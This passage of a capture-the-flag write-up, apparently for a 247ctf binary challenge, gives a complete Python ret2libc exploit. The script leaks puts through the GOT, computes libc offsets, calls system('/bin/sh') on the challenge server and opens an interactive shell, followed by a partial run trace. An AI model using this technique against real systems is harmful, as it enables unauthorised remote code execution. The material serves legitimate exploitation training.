&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[function VA] = [libc base address] + [function RVA]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Be aware that the second padding of the payload may change, so you need to recalculate it again, but we&amp;rsquo;re lucky enough and this time the padding is the same. With all of this in mind, here is how our final script would look like:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;socket&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;struct&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;hostname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ad520e503a0ec4e0.247ctf.com&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;50341&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AF_INET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;# TCP socket&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hostname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[*] Connected to &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hostname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2c&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x08048390&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;# puts@plt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0804853d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;# main&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0804a018&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;# puts@got&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;%b&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\r\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[*] Payload sent: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;B&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;puts_leak&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unpack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[*] puts leaked address: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{:#x}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;puts_leak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;puts_leak&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x67360&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[*] libc base address: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{:#x}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x3cd10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_exit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2ff70&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_shell&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x17b8cf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2c&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;%b&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\r\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[*] Payload sent: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;B&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;[*] Interactive shell&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;$ &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;exit&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;$ &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;ne&#34;&gt;EOFError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;ne&#34;&gt;KeyboardInterrupt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;pass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And an execution trace:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ python3 exploit-remote.py
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Connected to ad520e503a0ec4e0.247ctf.com:50341
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Payload sent: 56B
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; puts leaked address: 0xf7d5d360
